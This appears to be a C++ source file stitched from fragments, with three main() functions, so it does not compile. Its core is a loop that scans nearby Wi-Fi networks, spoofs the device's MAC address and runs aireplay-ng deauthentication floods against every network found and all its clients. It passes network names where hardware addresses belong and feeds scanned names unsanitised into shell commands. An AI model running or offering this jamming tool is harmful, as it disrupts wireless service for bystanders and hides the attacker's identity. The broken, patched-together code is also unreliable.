#include <iostream>
#include <iomanip>
#include <random>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <ctime>
#include <string>
#include <chrono>
#include <thread>
#include <cstdlib>


std::string random_mac() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(0x00, 0xff);

    std::stringstream ss;
    for (int i = 0; i < 6; ++i) {
        if (i > 0) ss << ":";
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }

    return ss.str();
}

int main() {
    std::cout << random_mac() << std::endl;
    
}



int main() {
    std::system("iptables -I INPUT -p icmp --icmp-type 13 -j DROP");

}

std::string executeCommand(const std::string& command) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) throw std::runtime_error("popen() failed!");

    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }

    pclose(pipe);
    return result;
}

std::string randomMac() {
    std::stringstream stream;
    for (int i = 0; i < 6; i++) {
        stream << std::hex << (rand() % 256);
        if (i < 5) stream << ":";
    }
    return stream.str();
}

int main() {
    while (true) {
        try {
            std::string output = executeCommand("iwlist wlan0 scan");
            std::vector<std::string> networks;
            std::istringstream iss(output);
            std::string line;
            while (std::getline(iss, line)) {
                if (line.find("ESSID") != std::string::npos) {
                    std::string essid = line.substr(line.find(":") + 1);
                    networks.push_back(essid);
                }
            }

            for (const auto& network : networks) {
                executeCommand("iwconfig wlan0 mode monitor");
                executeCommand("ifconfig wlan0 down");
                executeCommand("macchanger -m " + randomMac() + " wlan0");
                executeCommand("ifconfig wlan0 up");
                executeCommand("aireplay-ng -0 0 -a " + network + " -c FF:FF:FF:FF:FF:FF wlan0");
                executeCommand("iwconfig wlan0 mode managed");
                executeCommand("ifconfig wlan0 down");
                executeCommand("macchanger -p wlan0");
                executeCommand("ifconfig wlan0 up");

                // Add delay here if needed
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
        } catch (const std::exception& e) {
            std::cerr << "Error: " << e.what() << std::endl;
        }
    }

  try {
        // Restore iptables rules before exiting
        executeCommand("iptables -D INPUT -p icmp --icmp-type 13 -j DROP");
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    return 0;
}
